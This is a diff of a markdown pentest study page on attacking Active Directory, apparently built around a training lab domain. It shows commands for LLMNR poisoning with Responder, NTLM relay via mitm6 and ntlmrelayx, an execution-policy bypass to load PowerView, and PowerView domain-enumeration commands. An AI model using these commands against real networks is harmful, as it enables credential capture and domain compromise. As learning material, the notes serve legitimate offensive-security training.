@@ -8,9 +8,11 @@
 
 ## Active Directory
 
-[Five way to attack AD](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
+### Attach
 
-1. LLMNR Poisoning
+#### [Five way to attack AD](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
+
+#### LLMNR Poisoning
 
 ![](../.gitbook/assets/3%20%281%29%20%281%29.png)
 
@@ -22,9 +24,9 @@ responder -I eth0 -rdwv
 
 Crack the obtained hash using \#Hashcat or \#john
 
-1. SMB Relay attack
+#### SMB Relay attack
 
-   Instead of cracking the hashes gathered from responder, We can repay those hashes to machines and potentially gain access.
+Instead of cracking the hashes gathered from responder, We can repay those hashes to machines and potentially gain access.
 
 Requirements:
 
@@ -79,7 +81,7 @@ There are multiple ways we have to try, some might not work,
 * wmiexec.py
 * IPv6 Attack If Ipv6 enabled this attack creates DNS machine for IPv6 addresses. We can use victim machine to login to DC, when victim restart the machine. Once we get victim authenticated we can relay those credentials to LDAP.
 
-Tool : [mitm6](https://github.com/fox-it/mitm6)
+#### [mitm6](https://github.com/fox-it/mitm6)
 
 ```text
 mitm6 -d marvel.local
@@ -91,17 +93,18 @@ also need to set relay attack
 ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
 ```
 
-Resources: [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+Resources: 
 
-[https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+* [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
 
-**Attacking AD Strategies** 
+### **Attacking AD Strategies** 
 
 ![](../.gitbook/assets/1.png)
 
 ### Post Compromise Enumeration
 
-1. [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+####  ****[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
 To run PowerView on Victim machine,
 
@@ -113,5 +116,23 @@ powershell -ep bypass
 
 _Nothing will showup but it will load the PowerView_
 
-1. Bloodhound
+Common Commands:
+
+* Get-NetDomainController 
+* Get-DomainPolicy
+* \(Get-DomainPolicy\)."system access"
+* Get-NetUser
+* Get-NetUser \| select cn
+* Get-UserProperty
+* Get-UserProperty -Properties pwd
+* Get-UserProperty -Properties logoncount
+* Get-NetComputer
+* Get-NetComputer -FullData
+* Get-NetGroupMember -GroupName "Domain Admin"
+* Invoke-ShareFinder
+* Get-NetGPO
+* Get-NetGPO \| select displayname, whenchanged
+* [Powerview Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+#### Bloodhound
 
